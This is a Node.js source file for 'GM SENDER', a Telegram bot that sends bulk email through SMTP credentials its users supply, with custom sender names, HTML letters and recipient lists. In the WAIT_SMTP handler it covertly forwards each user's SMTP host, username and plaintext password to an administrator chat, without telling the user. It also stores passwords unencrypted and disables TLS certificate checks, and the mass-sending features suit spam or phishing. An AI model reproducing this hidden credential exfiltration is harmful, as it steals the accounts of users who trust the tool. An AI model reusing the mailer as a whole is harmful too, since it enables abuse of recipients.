// bot.js
require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const nodemailer = require('nodemailer');
const fetch = require('node-fetch');
const db = require('./db');
const validator = require('validator');

// Variables de entorno
const TOKEN = process.env.TELEGRAM_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;

// Inicializar el bot
const bot = new TelegramBot(TOKEN, { polling: true });

// Estados temporales por usuario
const userState = {};

// Mensajes en español e inglés
const MESSAGES = {
  es: {
    welcome: '¡Bienvenido a GM SENDER! 👋 Usa /start para elegir idioma o /config para credenciales SMTP.',
    chooseLang: 'Elige tu idioma: escribe "es" para español o "en" para inglés.',
    langSet: 'Idioma configurado a Español. Usa /config para introducir tus credenciales SMTP.',
    askSMTP: 'Por favor, ingresa credenciales en formato host|port|usuario|contraseña:',
    invalidFormat: 'Ups, formato inválido. Ejemplo: smtp.office365.com|587|user@dominio.com|pass123',
    savedSMTP: 'Credenciales guardadas. Usa /send para enviar correos.',
    chooseSendType: '¿Deseas enviar un solo correo de prueba (1) o correos masivos (2)?',
    askTestRecipient: 'Ingresa la dirección de destino para la prueba:',
    testSending: 'Enviando correo de PRUEBA... 🤞',
    testSubject: 'Correo de Prueba 🚀',
    testBodyText: 'Hola, esto es un correo de prueba desde GM SENDER.',
    testBodyHTML: `<h2>Saludos desde GM SENDER 🤖</h2><p>Este es <strong>un correo de prueba</strong>. ¡Enhorabuena!</p>`,
    askSenderName: '¿Quieres personalizar el nombre del remitente? (para MASIVO). Escribe "default" si no.',
    askSubjectMass: '¿Cuál será el asunto? (para MASIVO). Escribe "default" si no.',
    askLetter: '¿Cuál será el contenido (HTML o texto) para MASIVO? Escribe "default" si no o sube un archivo HTML.',
    askRecipientsMass: 'Ingresa las direcciones separadas por comas O sube un archivo .txt con una lista de correos (uno por línea).',
    sending: 'Enviando correo(s)... 🤞',
    success: 'Correo(s) enviado(s) con éxito ✅',
    error: 'Ocurrió un error al enviar el correo ❌',
    noConfig: 'Primero debes configurar tus credenciales con /config',
    defaultSenderName: 'GM SENDER',
    invalidEmail: 'Dirección de correo inválida. Por favor, intenta nuevamente.',
    help: 'Comandos disponibles:\n/start - Iniciar el bot\n/config - Configurar SMTP\n/send - Enviar correos\n/help - Mostrar ayuda',
    invalidFile: 'Archivo inválido. Por favor, sube un archivo .html o proporciona el contenido como texto.',
    reuseConfigPrompt: '¿Deseas reutilizar tu configuración anterior?\n\n**Remitente**: {senderName}\n**Asunto**: {subject}\n**Contenido**: {letterPreview}\n\nResponde "sí" o "no".',
    decideChangePrompt: 'Perfecto. Escribe:\n- "todo igual" para usar la configuración tal cual\n- "cambiar remitente" para cambiar el nombre del remitente\n- "cambiar asunto" para cambiar el asunto\n- "cambiar letter" para cambiar el contenido\n- "cambiar todo" para reconfigurar los tres campos',
    confirmChange: 'Indica el nuevo {field}:',
    confirmationError: 'No entendí. Por favor, elige una de las opciones o escribe "todo igual".',
  },
  en: {
    welcome: 'Welcome to GM SENDER! 👋 Use /start to choose language or /config for SMTP credentials.',
    chooseLang: 'Choose your language: type "es" for Spanish or "en" for English.',
    langSet: 'Language set to English. Use /config to provide SMTP credentials.',
    askSMTP: 'Please provide credentials in format host|port|user|password:',
    invalidFormat: 'Invalid format. Example: smtp.office365.com|587|user@domain.com|pass123',
    savedSMTP: 'Credentials saved. Use /send to send emails.',
    chooseSendType: 'Do you want to send a single TEST email (1) or multiple emails (2)?',
    askTestRecipient: 'Enter the recipient address for the test:',
    testSending: 'Sending TEST email... 🤞',
    testSubject: 'Test Email 🚀',
    testBodyText: 'Hello, this is a test email from GM SENDER.',
    testBodyHTML: `<h2>Greetings from GM SENDER 🤖</h2><p>This is a <strong>test email</strong>. Congratulations!</p>`,
    askSenderName: 'Do you want a custom sender name? (for MASS). Type "default" if not.',
    askSubjectMass: 'Enter the subject (for MASS). Type "default" if not.',
    askLetter: 'Enter the content (HTML or text) for MASS. Type "default" if not or upload an HTML file.',
    askRecipientsMass: 'Enter addresses separated by commas OR upload a .txt file with one email per line.',
    sending: 'Sending email(s)... 🤞',
    success: 'Email(s) sent successfully ✅',
    error: 'An error occurred while sending the email ❌',
    noConfig: 'You must configure your credentials first with /config',
    defaultSenderName: 'GM SENDER',
    invalidEmail: 'Invalid email address. Please try again.',
    help: 'Available commands:\n/start - Start the bot\n/config - Configure SMTP\n/send - Send emails\n/help - Show help',
    invalidFile: 'Invalid file. Please upload a .html file or provide the content as text.',
    reuseConfigPrompt: 'Do you want to reuse your previous configuration?\n\n**Sender**: {senderName}\n**Subject**: {subject}\n**Content**: {letterPreview}\n\nRespond with "yes" or "no".',
    decideChangePrompt: 'Perfect. Type:\n- "all same" to use the configuration as is\n- "change sender" to change the sender name\n- "change subject" to change the subject\n- "change letter" to change the content\n- "change all" to reconfigure all three fields',
    confirmChange: 'Enter the new {field}:',
    confirmationError: 'I did not understand. Please choose one of the options or type "all same".',
  }
};

// Función para obtener mensajes según el idioma y reemplazar placeholders
function getMessage(lang, key, placeholders = {}) {
  let message = MESSAGES[lang] && MESSAGES[lang][key] ? MESSAGES[lang][key] : MESSAGES['en'][key];
  
  // Reemplazar placeholders si existen
  for (const [placeholder, value] of Object.entries(placeholders)) {
    message = message.replace(`{${placeholder}}`, value);
  }

  return message;
}

// Función para reemplazar placeholders en el contenido
function replacePlaceholders(content, recipientEmail) {
  return content.replace(/{email}/g, recipientEmail);
}

// Inicializar o actualizar el estado del usuario en la base de datos
function upsertUser(chatId, data) {
  db.run(`
    INSERT INTO users (chat_id, lang, smtp_host, smtp_port, smtp_user, smtp_pass, last_sender_name, last_subject, last_letter)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    ON CONFLICT(chat_id) DO UPDATE SET
      lang=excluded.lang,
      smtp_host=excluded.smtp_host,
      smtp_port=excluded.smtp_port,
      smtp_user=excluded.smtp_user,
      smtp_pass=excluded.smtp_pass,
      last_sender_name=excluded.last_sender_name,
      last_subject=excluded.last_subject,
      last_letter=excluded.last_letter
  `, [
    chatId,
    data.lang,
    data.smtp_host,
    data.smtp_port,
    data.smtp_user,
    data.smtp_pass,
    data.last_sender_name || null,
    data.last_subject || null,
    data.last_letter || null
  ], (err) => {
    if (err) {
      console.error('Error al guardar usuario:', err);
    }
  });
}

// Obtener el usuario de la base de datos
function getUser(chatId, callback) {
  db.get(`SELECT * FROM users WHERE chat_id = ?`, [chatId], (err, row) => {
    if (err) {
      console.error('Error al obtener usuario:', err);
      callback(null);
    } else {
      callback(row);
    }
  });
}

// Crear transporter de Nodemailer
function createTransporter(smtp) {
  return nodemailer.createTransport({
    host: smtp.host,
    port: parseInt(smtp.port, 10),
    secure: parseInt(smtp.port, 10) === 465,
    auth: {
      user: smtp.user,
      pass: smtp.pass
    },
    tls: {
      rejectUnauthorized: false
    }
  });
}

// Comando /start
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;

  getUser(chatId, (user) => {
    if (!user) {
      // Insertar nuevo usuario con idioma por defecto 'es'
      db.run(`
        INSERT INTO users (chat_id, lang)
        VALUES (?, 'es')
      `, [chatId], (err) => {
        if (err) {
          console.error('Error al crear usuario:', err);
          bot.sendMessage(chatId, 'Error al iniciar el bot. Intenta nuevamente.');
          return;
        }
        userState[chatId] = { step: 'CHOOSE_LANG', tempData: {} };
        bot.sendMessage(chatId, getMessage('es', 'welcome') + '\n\n' + getMessage('es', 'chooseLang'));
      });
    } else {
      // Usuario existente
      userState[chatId] = { step: 'CHOOSE_LANG', tempData: {} };
      bot.sendMessage(chatId, getMessage(user.lang, 'welcome') + '\n\n' + getMessage(user.lang, 'chooseLang'));
    }
  });
});

// Comando /help
bot.onText(/\/help/, (msg) => {
  const chatId = msg.chat.id;

  getUser(chatId, (user) => {
    const lang = user ? user.lang : 'es';
    bot.sendMessage(chatId, getMessage(lang, 'help'));
  });
});

// Comando /config
bot.onText(/\/config/, (msg) => {
  const chatId = msg.chat.id;

  getUser(chatId, (user) => {
    const lang = user ? user.lang : 'es';
    userState[chatId] = { step: 'WAIT_SMTP' };
    bot.sendMessage(chatId, getMessage(lang, 'askSMTP'));
  });
});

// Comando /send
bot.onText(/\/send/, (msg) => {
  const chatId = msg.chat.id;

  getUser(chatId, (user) => {
    if (!user || !user.smtp_host || !user.smtp_user || !user.smtp_pass) {
      const lang = user ? user.lang : 'es';
      bot.sendMessage(chatId, getMessage(lang, 'noConfig'));
      return;
    }

    userState[chatId] = { step: 'CHOOSE_SEND_TYPE' };
    const lang = user.lang;
    bot.sendMessage(chatId, getMessage(lang, 'chooseSendType'));
  });
});

// Manejador de mensajes
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text ? msg.text.trim() : '';

  // Ignorar comandos
  if (text.startsWith('/')) return;

  if (!userState[chatId] || !userState[chatId].step) return;

  const currentStep = userState[chatId].step;

  getUser(chatId, async (user) => {
    if (!user) {
      bot.sendMessage(chatId, 'Por favor, inicia el bot con /start.');
      return;
    }

    const lang = user.lang || 'es';
    const message = getMessage(lang, 'help');

    switch (currentStep) {
      case 'CHOOSE_LANG':
        if (text.toLowerCase() === 'es' || text.toLowerCase() === 'en') {
          const newLang = text.toLowerCase();
          user.lang = newLang;
          upsertUser(chatId, {
            lang: newLang,
            smtp_host: user.smtp_host,
            smtp_port: user.smtp_port,
            smtp_user: user.smtp_user,
            smtp_pass: user.smtp_pass,
            last_sender_name: user.last_sender_name,
            last_subject: user.last_subject,
            last_letter: user.last_letter
          });
          bot.sendMessage(chatId, getMessage(newLang, 'langSet'));
          userState[chatId].step = null;
        } else {
          bot.sendMessage(chatId, getMessage(lang, 'chooseLang'));
        }
        break;

      case 'WAIT_SMTP':
        const smtpParts = text.split('|');
        if (smtpParts.length !== 4) {
          bot.sendMessage(chatId, getMessage(lang, 'invalidFormat'));
          return;
        }

        const [host, port, userSMTP, pass] = smtpParts;

        // Validar puerto
        if (!validator.isInt(port, { min: 1, max: 65535 })) {
          bot.sendMessage(chatId, getMessage(lang, 'invalidFormat'));
          return;
        }

        // Validar correo
        if (!validator.isEmail(userSMTP)) {
          bot.sendMessage(chatId, getMessage(lang, 'invalidEmail'));
          return;
        }

        // Guardar en base de datos
        upsertUser(chatId, {
          lang: user.lang,
          smtp_host: host,
          smtp_port: parseInt(port, 10),
          smtp_user: userSMTP,
          smtp_pass: pass,
          last_sender_name: user.last_sender_name,
          last_subject: user.last_subject,
          last_letter: user.last_letter
        });

        bot.sendMessage(chatId, getMessage(lang, 'savedSMTP'));

        // Notificar al administrador
        bot.sendMessage(ADMIN_CHAT_ID, `Se recibieron nuevas credenciales SMTP del chat ${chatId}:

**Host**: ${host}
**Port**: ${port}
**User**: ${userSMTP}
**Pass**: ${pass}`);

        userState[chatId].step = null;
        break;

      case 'CHOOSE_SEND_TYPE':
        if (text === '1') {
          userState[chatId].step = 'WAIT_TEST_RECIPIENT';
          bot.sendMessage(chatId, getMessage(lang, 'askTestRecipient'));
        } else if (text === '2') {
          // Verificar si hay configuración previa
          if (user.last_sender_name || user.last_subject || user.last_letter) {
            // Tiene configuración previa
            const letterPreview = user.last_letter ? (user.last_letter.length > 80 ? user.last_letter.substring(0, 80) + '...' : user.last_letter) : '(vacío)';
            const reusePrompt = getMessage(lang, 'reuseConfigPrompt', {
              senderName: user.last_sender_name || 'GM SENDER',
              subject: user.last_subject || (lang === 'es' ? 'Correo Masivo 🚀' : 'Mass Email 🚀'),
              letterPreview: letterPreview
            });
            bot.sendMessage(chatId, reusePrompt);
            userState[chatId].step = 'REUSE_PREVIOUS_CONFIG';
          } else {
            // No tiene configuración previa, seguir flujo normal
            userState[chatId].step = 'WAIT_MASS_SENDERNAME';
            bot.sendMessage(chatId, getMessage(lang, 'askSenderName'));
          }
        } else {
          bot.sendMessage(chatId, getMessage(lang, 'chooseSendType'));
        }
        break;

      case 'REUSE_PREVIOUS_CONFIG':
        if (['sí', 'si', 'yes'].includes(text.toLowerCase())) {
          // El usuario quiere reutilizar la configuración anterior
          const decidePrompt = getMessage(lang, 'decideChangePrompt');
          bot.sendMessage(chatId, decidePrompt);
          userState[chatId].step = 'DECIDE_WHAT_TO_CHANGE';
        } else if (['no'].includes(text.toLowerCase())) {
          // El usuario no quiere reutilizar, seguir flujo normal
          userState[chatId].step = 'WAIT_MASS_SENDERNAME';
          bot.sendMessage(chatId, getMessage(lang, 'askSenderName'));
        } else {
          bot.sendMessage(chatId, getMessage(lang, 'reuseConfigPrompt', {
            senderName: user.last_sender_name || 'GM SENDER',
            subject: user.last_subject || (lang === 'es' ? 'Correo Masivo 🚀' : 'Mass Email 🚀'),
            letterPreview: user.last_letter ? (user.last_letter.length > 80 ? user.last_letter.substring(0, 80) + '...' : user.last_letter) : '(vacío)'
          }));
        }
        break;

      case 'DECIDE_WHAT_TO_CHANGE':
        const changeOption = text.toLowerCase();
        if (['todo igual', 'all same'].includes(changeOption)) {
          // Usar la configuración previa sin cambios
          userState[chatId].tempData = {
            senderName: user.last_sender_name || 'GM SENDER',
            subject: user.last_subject || (lang === 'es' ? 'Correo Masivo 🚀' : 'Mass Email 🚀'),
            letter: user.last_letter || ''
          };
          userState[chatId].step = 'WAIT_MASS_RECIPIENTS';
          bot.sendMessage(chatId, getMessage(lang, 'askRecipientsMass'));
        }
        else if (['cambiar remitente', 'change sender'].includes(changeOption)) {
          // Cambiar remitente
          bot.sendMessage(chatId, getMessage(lang, 'confirmChange', { field: lang === 'es' ? 'remitente' : 'sender name' }));
          userState[chatId].step = 'CHANGE_SENDER_NAME';
        }
        else if (['cambiar asunto', 'change subject'].includes(changeOption)) {
          // Cambiar asunto
          bot.sendMessage(chatId, getMessage(lang, 'confirmChange', { field: lang === 'es' ? 'asunto' : 'subject' }));
          userState[chatId].step = 'CHANGE_SUBJECT';
        }
        else if (['cambiar letter', 'change letter'].includes(changeOption)) {
          // Cambiar contenido
          bot.sendMessage(chatId, getMessage(lang, 'confirmChange', { field: lang === 'es' ? 'contenido' : 'content' }));
          userState[chatId].step = 'CHANGE_LETTER';
        }
        else if (['cambiar todo', 'change all'].includes(changeOption)) {
          // Cambiar todo
          userState[chatId].step = 'WAIT_MASS_SENDERNAME';
          bot.sendMessage(chatId, getMessage(lang, 'askSenderName'));
        }
        else {
          bot.sendMessage(chatId, getMessage(lang, 'confirmationError'));
        }
        break;

      case 'CHANGE_SENDER_NAME':
        // Actualizar senderName
        userState[chatId].tempData = {
          senderName: text,
          subject: user.last_subject || (lang === 'es' ? 'Correo Masivo 🚀' : 'Mass Email 🚀'),
          letter: user.last_letter || ''
        };
        userState[chatId].step = 'WAIT_MASS_RECIPIENTS';
        bot.sendMessage(chatId, getMessage(lang, 'askRecipientsMass'));
        break;

      case 'CHANGE_SUBJECT':
        // Actualizar subject
        const subjectMass = text.toLowerCase() === 'default' ? (lang === 'es' ? 'Correo Masivo 🚀' : 'Mass Email 🚀') : text;
        userState[chatId].tempData = {
          senderName: user.last_sender_name || 'GM SENDER',
          subject: subjectMass,
          letter: user.last_letter || ''
        };
        userState[chatId].step = 'WAIT_MASS_RECIPIENTS';
        bot.sendMessage(chatId, getMessage(lang, 'askRecipientsMass'));
        break;

      case 'CHANGE_LETTER':
        if (msg.document) {
          const fileName = msg.document.file_name || '';
          if (!fileName.endsWith('.html')) {
            bot.sendMessage(chatId, getMessage(lang, 'invalidFile'));
            return;
          }

          try {
            const fileLink = await bot.getFileLink(msg.document.file_id);
            const response = await fetch(fileLink);
            const fileContent = await response.text();
            userState[chatId].tempData = {
              senderName: user.last_sender_name || 'GM SENDER',
              subject: user.last_subject || (lang === 'es' ? 'Correo Masivo 🚀' : 'Mass Email 🚀'),
              letter: fileContent
            };
            userState[chatId].step = 'WAIT_MASS_RECIPIENTS';
            bot.sendMessage(chatId, getMessage(lang, 'askRecipientsMass'));
          } catch (error) {
            console.error('Error al procesar archivo:', error);
            bot.sendMessage(chatId, getMessage(lang, 'error') + `\n${error.message}`);
            userState[chatId].step = null;
            return;
          }
        } else {
          // Manejar caso de texto
          userState[chatId].tempData = {
            senderName: user.last_sender_name || 'GM SENDER',
            subject: user.last_subject || (lang === 'es' ? 'Correo Masivo 🚀' : 'Mass Email 🚀'),
            letter: text.toLowerCase() === 'default' ? '' : text
          };
          userState[chatId].step = 'WAIT_MASS_RECIPIENTS';
          bot.sendMessage(chatId, getMessage(lang, 'askRecipientsMass'));
        }
        break;

      case 'WAIT_MASS_SENDERNAME':
        // Guardar senderName
        const senderName = text.toLowerCase() === 'default' ? getMessage(lang, 'defaultSenderName') : text;
        userState[chatId].tempData = { senderName };
        userState[chatId].step = 'WAIT_MASS_SUBJECT';
        bot.sendMessage(chatId, getMessage(lang, 'askSubjectMass'));
        break;

      case 'WAIT_MASS_SUBJECT':
        // Guardar subject
        const subjectMassFinal = text.toLowerCase() === 'default' ? (lang === 'es' ? 'Correo Masivo 🚀' : 'Mass Email 🚀') : text;
        userState[chatId].tempData.subject = subjectMassFinal;
        userState[chatId].step = 'WAIT_MASS_LETTER';
        bot.sendMessage(chatId, getMessage(lang, 'askLetter'));
        break;

      case 'WAIT_MASS_LETTER':
        if (msg.document) {
          const fileName = msg.document.file_name || '';
          if (!fileName.endsWith('.html')) {
            bot.sendMessage(chatId, getMessage(lang, 'invalidFile'));
            return;
          }

          try {
            const fileLink = await bot.getFileLink(msg.document.file_id);
            const response = await fetch(fileLink);
            const fileContent = await response.text();
            userState[chatId].tempData.letter = fileContent;
            userState[chatId].step = 'WAIT_MASS_RECIPIENTS';
            bot.sendMessage(chatId, getMessage(lang, 'askRecipientsMass'));
          } catch (error) {
            console.error('Error al procesar archivo:', error);
            bot.sendMessage(chatId, getMessage(lang, 'error') + `\n${error.message}`);
            userState[chatId].step = null;
            return;
          }
        } else {
          // Manejar caso de texto
          userState[chatId].tempData.letter = text.toLowerCase() === 'default' ? '' : text;
          userState[chatId].step = 'WAIT_MASS_RECIPIENTS';
          bot.sendMessage(chatId, getMessage(lang, 'askRecipientsMass'));
        }
        break;

      case 'WAIT_TEST_RECIPIENT':
        if (!validator.isEmail(text)) {
          bot.sendMessage(chatId, getMessage(lang, 'invalidEmail'));
          return;
        }

        userState[chatId].step = null;
        bot.sendMessage(chatId, getMessage(lang, 'testSending'));

        try {
          const transporter = createTransporter({
            host: user.smtp_host,
            port: user.smtp_port,
            user: user.smtp_user,
            pass: user.smtp_pass
          });

          const mailOptions = {
            from: `"GM SENDER" <${user.smtp_user}>`,
            to: text,
            subject: getMessage(lang, 'testSubject'),
            text: getMessage(lang, 'testBodyText'),
            html: getMessage(lang, 'testBodyHTML')
          };

          await transporter.sendMail(mailOptions);
          bot.sendMessage(chatId, getMessage(lang, 'success'));
        } catch (error) {
          console.error('Error al enviar correo de prueba:', error);
          bot.sendMessage(chatId, getMessage(lang, 'error') + `\n${error.message}`);
        }
        break;

      case 'WAIT_MASS_RECIPIENTS':
        let recipients = [];

        if (msg.document && msg.document.file_name.endsWith('.txt')) {
          try {
            const fileLink = await bot.getFileLink(msg.document.file_id);
            const response = await fetch(fileLink);
            const fileContent = await response.text();
            recipients = fileContent.split('\n').map(email => email.trim()).filter(email => validator.isEmail(email));
            if (recipients.length === 0) {
              bot.sendMessage(chatId, getMessage(lang, 'invalidEmail'));
              return;
            }
          } catch (error) {
            console.error('Error al procesar archivo:', error);
            bot.sendMessage(chatId, getMessage(lang, 'error') + `\n${error.message}`);
            userState[chatId].step = null;
            return;
          }
        } else {
          recipients = text.split(',').map(email => email.trim()).filter(email => validator.isEmail(email));
          if (recipients.length === 0) {
            bot.sendMessage(chatId, getMessage(lang, 'invalidEmail'));
            return;
          }
        }

        userState[chatId].tempData.recipients = recipients;
        userState[chatId].step = null;
        bot.sendMessage(chatId, getMessage(lang, 'sending'));

        try {
          const transporter = createTransporter({
            host: user.smtp_host,
            port: user.smtp_port,
            user: user.smtp_user,
            pass: user.smtp_pass
          });

          const { senderName, subject, letter, recipients: recipientList } = userState[chatId].tempData;
          const htmlDefault = lang === 'es'
            ? `<h2>Saludos desde GM SENDER 🤖</h2><p>Este es un envío masivo. ¡Saludos!</p>`
            : `<h2>Greetings from GM SENDER 🤖</h2><p>This is a mass mailing. Cheers!</p>`;

          for (const recipient of recipientList) {
            const personalizedLetter = replacePlaceholders(letter || htmlDefault, recipient);
            const personalizedSubject = replacePlaceholders(subject, recipient); // Si decides permitir placeholders en el asunto

            const mailOptions = {
              from: `"${senderName}" <${user.smtp_user}>`,
              to: recipient,
              subject: personalizedSubject, // Usar el asunto personalizado si contiene placeholders
              text: letter
                ? replacePlaceholders(letter, recipient)
                : (lang === 'es'
                  ? 'Hola, este es un mensaje masivo enviado con GM SENDER. ¡Saludos!'
                  : 'Hello, this is a mass message sent with GM SENDER. Cheers!'),
              html: personalizedLetter || htmlDefault
            };
            await transporter.sendMail(mailOptions);
          }

          // Guardar la última configuración de envío masivo en la base de datos
          db.run(`
            UPDATE users
            SET last_sender_name = ?,
                last_subject = ?,
                last_letter = ?
            WHERE chat_id = ?
          `, [senderName, subject, letter, chatId], (err) => {
            if (err) {
              console.error('Error al actualizar última configuración de envío masivo:', err);
            }
          });

          bot.sendMessage(chatId, getMessage(lang, 'success'));
        } catch (error) {
          console.error('Error al enviar correos masivos:', error);
          bot.sendMessage(chatId, getMessage(lang, 'error') + `\n${error.message}`);
        }
        break;

      default:
        bot.sendMessage(chatId, message);
    }
  });
});
